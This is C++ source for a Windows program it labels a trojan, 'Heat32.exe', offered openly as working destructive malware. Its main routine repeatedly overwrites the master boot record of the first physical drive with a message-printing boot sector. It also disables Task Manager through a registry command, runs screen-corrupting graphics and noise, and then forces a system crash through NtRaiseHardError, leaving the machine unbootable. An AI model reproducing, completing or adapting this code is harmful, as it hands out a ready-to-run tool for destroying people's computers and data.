//warning: this is a dangerous trojan!
#include <windows.h>
#include <cmath>
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
     COLORREF rgb;
     struct {
         BYTE r;
         BYTE g;
         BYTE b;
         BYTE Reserved;
     };
}_RGBQUAD, *PRGBQUAD;

const unsigned char BootRec[] = {
0xB8, 0x03, 0x00, 0xCD, 0x10, 0x31, 0xC0, 0x8E, 0xD8, 0xB8, 0x00, 0xB8, 0x8E, 0xC0, 0x31, 0xFF, 
0xB9, 0xD0, 0x07, 0xB8, 0x20, 0x1F, 0xF3, 0xAB, 0xBE, 0x2D, 0x7C, 0x8A, 0x04, 0x3C, 0x00, 0x74, 
0x0A, 0xB4, 0x0E, 0xBB, 0x0F, 0x00, 0xCD, 0x10, 0x46, 0xEB, 0xF0, 0xEB, 0xFE, 0x59, 0x6F, 0x75, 
0x72, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x72, 0x27, 0x73, 0x20, 0x4D, 0x42, 0x52, 
0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72, 0x6F, 
0x79, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x48, 0x65, 0x61, 0x74, 0x33, 0x32, 0x2E, 0x65, 0x78, 
0x65, 0x21, 0x0A, 0x43, 0x6F, 0x64, 0x65, 0x3A, 0x20, 0x30, 0x78, 0x42, 0x33, 0x30, 0x30, 0x30, 
0x30, 0x43, 0x41, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD WINAPI mbr(LPVOID lpParam) {
    while(1) {
        DWORD dwBytesWritten;
        HANDLE hDisk = CreateFileW(
            L"\\\\.\\PhysicalDrive0",
            GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            0, OPEN_EXISTING, 0, 0
        );
        WriteFile(hDisk, BootRec, 512, &dwBytesWritten, 0);
        CloseHandle(hDisk);
    }
}

DWORD WINAPI notaskmgr(LPVOID lpParam) {
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    return 1;
}

DWORD WINAPI textz(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sx = GetSystemMetrics(0);
    int sy = GetSystemMetrics(1);
    LPCWSTR lpText = L"HEAT";
    while(1) {
        hdc = GetDC(0);
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI beziers(LPVOID lpParam) {
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    while(1) {
        HDC hdc = GetDC(0);
        POINT p[4] = { rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh };
        HPEN hPen = CreatePen(PS_SOLID, 5, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, hPen);
        PolyBezier(hdc, p, 4);
        DeleteObject(hPen);
        ReleaseDC(0, hdc);
        Sleep(4);
    }
}

DWORD WINAPI pixels(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    HDC hdcMem = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
         hdc = GetDC(0);
         BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
         for (int i = 0; i < w * h; i++) {
              int x = i % w;
              int y = i / w;
              rgbScreen[i].rgb += x + y;
         }
         BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
         ReleaseDC(0, hdc);
         DeleteDC(hdc);
    }
}

DWORD WINAPI profect(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while(1) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI sines(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    double angle = 0;
    for (;;) {
         hdc = GetDC(0);
         for (float i = 0; i < sw + sh; i += 0.99f) {
              int a = sin(angle) * 20;
              BitBlt(hdc, i, 0, 1, sh, hdc, i, a, SRCCOPY);
              angle += M_PI / 40;
              DeleteObject(&a);
              DeleteObject(&i);
         }
         ReleaseDC(0, hdc);
         DeleteDC(hdc);
         DeleteObject(&sw);
         DeleteObject(&sh);
         DeleteObject(&angle);
    }
}

DWORD WINAPI darkr(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI crash(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    HDC hdcMem = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
         hdc = GetDC(0);
         BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
         for (int i = 0; i < w * h; i++) {
              rgbScreen[i].rgb = rand();
         }
         BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
         ReleaseDC(0, hdc);
         DeleteDC(hdc);
    }
}

VOID WINAPI sound1() {
   HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t) {
         buffer[t] = static_cast<char>(t/8>>(t>>9)*t/((t>>14&3)+4));
    }

    WAVEHDR header = { buffer, sizeof(buffer) };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
   HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t) {
         buffer[t] = static_cast<char>(t>>5|(t<<3)+12*t*(t>>13|(t>>1|t>>10|t>>2)&t>>8));
    }

    WAVEHDR header = { buffer, sizeof(buffer) };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
   HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t) {
         buffer[t] = static_cast<char>(5*t&t>>7|3*t&4*t>>10);
    }

    WAVEHDR header = { buffer, sizeof(buffer) };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
   HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t) {
         buffer[t] = static_cast<char>((t>>6|t<<1)+(t>>5|t<<3|t>>3)|t>>2|t<<1);
    }

    WAVEHDR header = { buffer, sizeof(buffer) };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
   HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t) {
         buffer[t] = static_cast<char>(64*(t>>3|t>>4|t>>9)+(t>>11&t<<2)^2*(t>>16|t|t>>7)+32*(t>>t&32));
    }

    WAVEHDR header = { buffer, sizeof(buffer) };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
   HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t) {
         buffer[t] = static_cast<char>(10*(t>>7|3*t|t>>(t>>15))+(t>>8&5));
    }

    WAVEHDR header = { buffer, sizeof(buffer) };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int main() {
    if (MessageBoxW(NULL, L"Execute malware?", L"Heat32.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    } else {
        if (MessageBoxW(NULL, L"Are you sure? It will make your PC unbootable.", L"Heat32.exe - LAST WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        } else {
            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, notaskmgr, 0, 0, 0);
            Sleep(2000);
            HANDLE thread1 = CreateThread(0, 0, textz, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            Sleep(100);
            HANDLE thread2 = CreateThread(0, 0, beziers, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, pixels, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, profect, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            Sleep(100);
            HANDLE thread5 = CreateThread(0, 0, darkr, 0, 0, 0);
            HANDLE thread5dot1 = CreateThread(0, 0, sines, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            TerminateThread(thread5dot1, 0);
            CloseHandle(thread5dot1);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, crash, 0, 0, 0);
            sound6();
            Sleep(30000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC0000005, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}